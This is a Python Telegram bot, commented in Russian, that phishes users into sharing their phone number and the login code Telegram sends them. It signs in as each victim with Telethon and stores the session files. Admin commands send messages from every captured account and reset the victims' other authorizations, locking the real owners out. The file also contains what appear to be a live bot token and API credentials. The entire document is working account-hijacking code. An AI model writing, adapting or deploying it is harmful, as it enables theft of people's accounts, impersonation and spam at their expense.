import os
import asyncio
import logging

from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    ReplyKeyboardMarkup,
    KeyboardButton,
    Contact,
    ForceReply,
)
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

from telethon import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    FloodWaitError,
)

# ────────────────────────────────────────────────
# НАСТРОЙКИ + ЛОГГИНГ
# ────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

BOT_TOKEN = '8757500911:AAEbSh9hlRam0GYC1HdkoXCGTd9Q1vVBeNc'          # ← вставь свой
API_ID = 31462757         # ← свой
API_HASH = '79ae4e151e84526e11b107e99ad67177'
ADMIN_IDS = {8559221549}

SESSIONS_DIR = "sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)

storage = MemoryStorage()
dp = Dispatcher(storage=storage)
router = Router()
dp.include_router(router)


# ────────────────────────────────────────────────
# СОСТОЯНИЯ
# ────────────────────────────────────────────────
class AddSession(StatesGroup):
    waiting_phone = State()
    waiting_code = State()


class SendMessage(StatesGroup):
    waiting_username = State()
    waiting_text = State()


# ────────────────────────────────────────────────
# КЛАВИАТУРЫ
# ────────────────────────────────────────────────
def get_continue_keyboard() -> ReplyKeyboardMarkup:
    kb = ReplyKeyboardMarkup(
        resize_keyboard=True,
        one_time_keyboard=True,
        keyboard=[
            [KeyboardButton(text="Продолжить", request_contact=True)]
        ]
    )
    return kb


# ────────────────────────────────────────────────
# /start
# ────────────────────────────────────────────────
@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    user_id = message.from_user.id

    if user_id in ADMIN_IDS:
        count = len([f for f in os.listdir(SESSIONS_DIR) if f.endswith(".session")])
        text = (
            f"Привет, админ!\n"
            f"Сейчас сессий: <b>{count}</b>\n\n"
            "<code>/send</code> — разослать сообщение от всех аккаунтов\n"
            "<code>/auth</code> — сброс чужих авторизаций (24ч)\n"
            "<code>/count</code> — сколько сессий"
        )
        await message.answer(text)
        return

    # Обычный пользователь
    await message.answer(
        "Привет! Нажми «Продолжить», чтобы поделиться номером и получить код.",
        reply_markup=get_continue_keyboard()
    )
    await state.set_state(AddSession.waiting_phone)


# ────────────────────────────────────────────────
# Добавление сессии — шаг 1 (контакт)
# ────────────────────────────────────────────────
@router.message(F.contact, StateFilter(AddSession.waiting_phone))
async def process_phone(message: Message, state: FSMContext):
    contact: Contact | None = message.contact
    if not contact:
        await message.reply("Нужно поделиться номером через кнопку.")
        return

    phone = contact.phone_number.replace("+", "").replace(" ", "").replace("-", "")
    if not phone.isdigit() or len(phone) < 9:
        await message.reply("Некорректный номер.")
        await state.clear()
        return

    session_path = f"{SESSIONS_DIR}/{phone}.session"

    if os.path.exists(session_path):
        await message.reply(f"Сессия для +{phone} уже существует. Перезаписываем?")

    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            sent_code = await client.send_code_request(phone)
            await state.update_data(
                phone=phone,
                phone_code_hash=sent_code.phone_code_hash,
                session_path=session_path
            )
            await message.reply(
                f"Код отправлен на <code>+{phone}</code>\n\nВведи 5-значный код:",
                reply_markup=ForceReply(selective=True)
            )
            await state.set_state(AddSession.waiting_code)
        else:
            await message.reply("Этот номер уже авторизован здесь.")
            await state.clear()

    except FloodWaitError as e:
        await message.reply(f"Слишком много попыток. Подожди {e.seconds // 60 + 1} минут.")
        await state.clear()
    except Exception as e:
        logger.error(f"Ошибка при добавлении сессии {phone}: {e}")
        await message.reply(f"Ошибка: {str(e)[:200]}")
        await state.clear()
    finally:
        if 'client' in locals():
            await client.disconnect()


# ────────────────────────────────────────────────
# Добавление сессии — шаг 2 (код)
# ────────────────────────────────────────────────
@router.message(StateFilter(AddSession.waiting_code))
async def process_code(message: Message, state: FSMContext):
    code = message.text.strip()
    if not code.isdigit() or len(code) != 5:
        await message.reply("Код — это ровно 5 цифр.")
        return

    data = await state.get_data()
    phone = data.get("phone")
    phone_code_hash = data.get("phone_code_hash")
    session_path = data.get("session_path")

    if not all([phone, phone_code_hash, session_path]):
        await message.reply("Сессия потерялась. Начни заново с /start")
        await state.clear()
        return

    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()
        await client.sign_in(
            phone=phone,
            code=code,
            phone_code_hash=phone_code_hash
        )
        await message.reply(
            f"Готово! Сессия для <code>+{phone}</code> сохранена.\n"
            "Можешь удалить это сообщение и код из чата."
        )
        await state.clear()

    except PhoneCodeInvalidError:
        await message.reply("Неверный код. Попробуй ещё раз.")
    except PhoneCodeExpiredError:
        await message.reply("Код устарел. Нажми /start заново.")
    except SessionPasswordNeededError:
        await message.reply(
            "На аккаунте включена двухфакторная аутентификация.\n"
            "Пока поддерживаем только аккаунты без 2FA."
        )
    except FloodWaitError as e:
        await message.reply(f"Флуд-лимит. Подожди {e.seconds // 60 + 1} мин.")
        await state.clear()
    except Exception as e:
        logger.error(f"Ошибка при sign_in {phone}: {e}")
        await message.reply(f"Ошибка: {str(e)[:180]}")
        await state.clear()
    finally:
        if 'client' in locals():
            await client.disconnect()


# ────────────────────────────────────────────────
# Админ-команды (остальные без изменений, но с Router)
# ────────────────────────────────────────────────
@router.message(Command("send"))
async def cmd_send(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS:
        return
    await message.reply("Введи username получателя (без @):")
    await state.set_state(SendMessage.waiting_username)


@router.message(StateFilter(SendMessage.waiting_username))
async def process_username(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS:
        await state.clear()
        return
    username = message.text.strip().lstrip("@")
    if not username:
        await message.reply("Некорректный username.")
        return
    await state.update_data(username=username)
    await message.reply("Теперь введи текст сообщения:")
    await state.set_state(SendMessage.waiting_text)


@router.message(StateFilter(SendMessage.waiting_text))
async def process_text_and_send(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS:
        await state.clear()
        return

    text = message.text
    data = await state.get_data()
    target = data.get("username")

    success = 0
    failed = 0

    for fname in os.listdir(SESSIONS_DIR):
        if not fname.endswith(".session"):
            continue
        session_path = os.path.join(SESSIONS_DIR, fname)
        try:
            client = TelegramClient(session_path, API_ID, API_HASH)
            await client.connect()
            if await client.is_user_authorized():
                await client.send_message(target, text)
                success += 1
            await client.disconnect()
        except Exception as e:
            logger.error(f"Ошибка отправки с {fname}: {e}")
            failed += 1

    await message.reply(f"Отправлено успешно: {success}\nНе удалось: {failed}")
    await state.clear()


@router.message(Command("auth"))
async def cmd_reset_auth(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    count = 0
    for fname in os.listdir(SESSIONS_DIR):
        if not fname.endswith(".session"):
            continue
        try:
            client = TelegramClient(os.path.join(SESSIONS_DIR, fname), API_ID, API_HASH)
            await client.connect()
            if await client.is_user_authorized():
                auths = await client.get_authorizations()
                for auth in auths:
                    if auth.app_name != "TelegramTester":  # поменяй на своё
                        await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
                        count += 1
            await client.disconnect()
        except Exception as e:
            logger.error(e)
    await message.reply(f"Сброшено авторизаций: {count}")


@router.message(Command("count"))
async def cmd_count(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    count = len([f for f in os.listdir(SESSIONS_DIR) if f.endswith(".session")])
    await message.reply(f"Сессий сейчас: {count}")


# ────────────────────────────────────────────────
# Запуск
# ────────────────────────────────────────────────
async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
